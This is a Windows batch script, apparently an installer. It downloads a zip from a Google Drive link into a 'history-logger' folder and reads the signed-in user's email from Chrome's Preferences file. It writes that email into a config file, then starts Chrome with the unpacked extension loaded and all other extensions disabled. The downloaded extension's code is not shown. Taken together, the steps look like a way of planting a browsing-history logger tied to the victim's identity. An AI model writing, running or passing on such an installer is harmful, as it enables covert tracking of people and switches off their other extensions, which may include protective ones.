@echo off
setlocal enabledelayedexpansion

REM ─── CONFIG ────────────────────────────────────────────────
set "ZIP_URL=https://drive.google.com/uc?export=download&id=1_MrCTaWFitVrrapsDodqTZduIvWKHCtU"
set "WORKDIR=%~dp0history-logger"
REM ─────────────────────────────────────────────────────────────

echo [1] Creating work folder "%WORKDIR%"…
if exist "%WORKDIR%" rd /s /q "%WORKDIR%"
mkdir "%WORKDIR%" || (echo Failed to mkdir & pause & exit /b)

echo [2] Downloading extension.zip from Drive…
powershell -NoProfile -Command ^
  "Invoke-WebRequest '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing" 
if errorlevel 1 (echo Download failed & pause & exit /b)

echo [3] Extracting ext.zip…
powershell -NoProfile -Command ^
  "Expand-Archive -Path '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force"
if errorlevel 1 (echo Unzip failed & pause & exit /b)

echo [4] Checking unpacked files:
dir "%WORKDIR%"  

echo [5] Reading Chrome email from Preferences…
set "PREF=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Preferences"
if not exist "%PREF%" (
  echo Prefs not found at "%PREF%" & pause & exit /b
)
for /f "delims=" %%E in (`
  powershell -NoProfile -Command ^
    "try{(Get-Content -Raw '%PREF%' | ConvertFrom-Json).account_info.email}catch{''}"
`) do set "EMAIL=%%E"
if not defined EMAIL (
  set "EMAIL=anonymous@demo.com"
  echo No email found, using anonymous@demo.com
) else (
  echo Found email: %EMAIL%
)

echo [6] Writing config.json…
(
  echo {^"userEmail^":^"%EMAIL%"^}
) > "%WORKDIR%\config.json"
type "%WORKDIR%\config.json"

echo [7] Launching Chrome with load-extension…
start "" chrome.exe --disable-extensions-except="%WORKDIR%" --load-extension="%WORKDIR%"

echo Done.  If Chrome didn’t load your extension, open:
echo    chrome://extensions
echo and enable “Developer mode” and click “Load unpacked” at:
echo    %WORKDIR%
pause
